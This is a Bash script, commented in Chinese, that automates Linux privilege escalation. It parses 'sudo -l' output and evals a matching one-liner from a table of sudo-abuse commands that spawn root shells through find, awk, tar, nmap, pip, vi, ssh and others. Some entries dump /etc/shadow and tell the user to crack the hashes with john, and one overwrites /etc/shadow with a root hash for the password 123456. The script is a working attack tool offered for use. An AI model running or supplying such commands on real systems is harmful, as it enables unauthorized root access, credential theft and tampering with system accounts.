#!/bin/bash

# 获取当前用户
CURRENT_USER=$(whoami)
echo "当前用户: $CURRENT_USER"

# 检查 sudo 权限
SUDO_OUTPUT=$(sudo -l)

echo "检查 sudo 权限..."
echo "$SUDO_OUTPUT"

# 定义符合条件的提权命令及利用方式
declare -A PRIVILEGE_COMMANDS
PRIVILEGE_COMMANDS["/usr/bin/find"]="sudo find /home -exec /bin/bash \\;"
PRIVILEGE_COMMANDS["/usr/bin/awk"]="sudo awk 'BEGIN {system(\"/bin/bash\")}'"
PRIVILEGE_COMMANDS["/usr/bin/perl"]="sudo perl -e 'exec \"/bin/bash\";'"
PRIVILEGE_COMMANDS["/usr/bin/python"]="sudo python -c 'import pty; pty.spawn(\"/bin/bash\")' || sudo python3 -c \"import os;os.system('/bin/bash')\""
PRIVILEGE_COMMANDS["/bin/tar"]="sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash"
PRIVILEGE_COMMANDS["/usr/bin/strace"]="sudo strace -o /dev/null /bin/bash"
PRIVILEGE_COMMANDS["/usr/bin/nmap"]="echo \"os.execute('/bin/bash')\" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse"
PRIVILEGE_COMMANDS["/usr/bin/zip"]="sudo zip /tmp/tmp.zip /tmp/ -T --unzip-command=\"sh -c /bin/bash\""
PRIVILEGE_COMMANDS["/usr/bin/apt-get"]="TF=\$(mktemp) && echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > \$TF && sudo apt-get install -c \$TF sl"
PRIVILEGE_COMMANDS["/usr/bin/apt"]="TF=\$(mktemp) && echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > \$TF && sudo apt install -c \$TF sl"
PRIVILEGE_COMMANDS["/usr/bin/dpkg"]="TF=\$(mktemp) && echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > \$TF && sudo dpkg -i /path/to/some/package.deb"
PRIVILEGE_COMMANDS["/usr/bin/xxd"]="sudo xxd /etc/shadow | xxd -r > /tmp/shadow_copy && echo '已成功导出 /etc/shadow 到 /tmp/shadow_copy，您可以使用工具尝试破解密码。'"
PRIVILEGE_COMMANDS["/usr/bin/sed"]="sudo sed -n '1e exec bash 1>&0' /etc/passwd"
PRIVILEGE_COMMANDS["/usr/bin/pip"]="TF=\$(mktemp -d) && echo 'import os; os.system(\"/bin/bash\")' > \$TF/setup.py && sudo pip install \$TF"
PRIVILEGE_COMMANDS["/usr/bin/taskset"]="sudo taskset 1 /bin/sh -p"
PRIVILEGE_COMMANDS["/usr/bin/gcc"]="sudo gcc -wrapper /bin/sh,-s ."
PRIVILEGE_COMMANDS["/usr/bin/date"]="sudo date -f /etc/shadow && echo '请将暴露的 root hash 复制出来，并使用 john 工具破解。如果破解成功，可以获得 root 权限。'"
PRIVILEGE_COMMANDS["/usr/bin/cpulimit"]="sudo cpulimit -l 100 -f /bin/bash"
PRIVILEGE_COMMANDS["/usr/bin/vi"]="sudo vi -c ':!/bin/bash'"
PRIVILEGE_COMMANDS["/usr/bin/wall"]="sudo wall /etc/shadow && echo '请将暴露的 root hash 复制出来，并使用 john 工具破解。如果破解成功，可以获得 root 权限。'"
PRIVILEGE_COMMANDS["/usr/bin/watch"]="sudo watch -x bash -c 'reset; exec bash 1>&0 2>&0'"
PRIVILEGE_COMMANDS["/usr/bin/pkexec"]="sudo pkexec /bin/bash"
PRIVILEGE_COMMANDS["/usr/bin/rvim"]="sudo rvim -c ':python import os;os.execl(\"/bin/bash\",\"bash\",\"-c\",\"reset;exec bash\")'"
PRIVILEGE_COMMANDS["/usr/bin/screen"]="sudo screen && echo '按回车进入具有 root 权限的 shell。'"
PRIVILEGE_COMMANDS["/usr/bin/script"]="sudo script -q /dev/null && echo '您已进入 root 权限的环境。'"
PRIVILEGE_COMMANDS["/usr/bin/service"]="sudo service ../../bin/bash && echo '已启动 root shell。'"
PRIVILEGE_COMMANDS["/usr/bin/socat"]="sudo socat stdin exec:/bin/bash && echo '已启动 root shell。'"
PRIVILEGE_COMMANDS["/usr/bin/ssh"]="sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x && echo '已进入 root shell。'"

# 特殊情况需要交互操作的命令
declare -A INTERACTIVE_COMMANDS
INTERACTIVE_COMMANDS["/usr/bin/less"]="请执行以下步骤完成提权：\n1. 执行命令：sudo less /etc/hosts\n2. 在界面中输入：!bash"
INTERACTIVE_COMMANDS["/usr/bin/more"]="请执行以下步骤完成提权：\n1. 执行命令：sudo more /etc/hosts\n2. 在界面中输入：!bash"
INTERACTIVE_COMMANDS["/usr/bin/git"]="请执行以下步骤完成提权：\n1. 执行命令：sudo git help status\n2. 在界面中输入：!bash"
INTERACTIVE_COMMANDS["/usr/bin/ftp"]="请执行以下步骤完成提权：\n1. 执行命令：sudo ftp\n2. 在交互界面中输入：!bash"

INTERACTIVE_COMMANDS["/usr/bin/cp"]="请执行以下步骤完成提权：\n1. 创建一个临时文件：\n   TF=\$(mktemp)\n   echo 'root:\$6\$OVS9vZLjXNT67Okt\$zUAsr7tOfb21O3Cbh1rM08rTtiX2piXRPG1Y1EPqIMyH.DI59SeBugZYB9SK7cOiXV0OEQ9YDDoCDFuy9s7Kk/:19870:0:99999:7:::' > \$TF\n2. 使用以下命令将临时文件复制到 /etc/shadow：\n   sudo /usr/bin/cp \$TF /etc/shadow\n3. 清理临时文件：\n   rm -f \$TF\n4. 使用密码 123456 切换到 root 用户：\n   su root"

INTERACTIVE_COMMANDS["/usr/bin/man"]="请执行以下步骤完成提权：\n1. 执行命令：sudo man man\n2. 在界面中输入：!bash"

# 遍历可能的命令
for CMD in "${!PRIVILEGE_COMMANDS[@]}"; do
    if echo "$SUDO_OUTPUT" | grep -q "$CMD"; then
        echo "发现符合条件的命令: $CMD"
        echo "尝试提权..."
        eval "${PRIVILEGE_COMMANDS[$CMD]}"
        exit 0
    fi
done

# 处理需要交互的命令
for CMD in "${!INTERACTIVE_COMMANDS[@]}"; do
    if echo "$SUDO_OUTPUT" | grep -q "$CMD"; then
        echo "发现需要交互操作的命令: $CMD"
        echo -e "${INTERACTIVE_COMMANDS[$CMD]}"
        exit 0
    fi
done

echo "未找到符合条件的提权命令。"
exit 1
